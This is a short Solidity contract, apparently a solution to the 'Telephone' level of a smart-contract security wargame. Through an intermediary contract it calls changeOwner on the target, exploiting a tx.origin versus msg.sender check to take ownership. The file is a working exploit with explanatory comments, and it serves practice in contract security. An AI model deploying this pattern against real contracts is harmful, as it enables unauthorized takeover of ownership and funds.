// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./04-telephone.sol";

contract Attack04 {
    // state variable - stores an instance of Telephone
    // contract that we will interact with
    Telephone telephoneContract;

    // constructor takes address of deployed instance
    // of the Telephone contract to attack
    constructor(address _telephoneContract) {
        // allows Attack04 to interact with deployed Telephone contract
        telephoneContract = Telephone(_telephoneContract);
    }

    // calls changeOwner() on our instance of Telephone contract
    function attack() public {
        telephoneContract.changeOwner(msg.sender);
    }
}
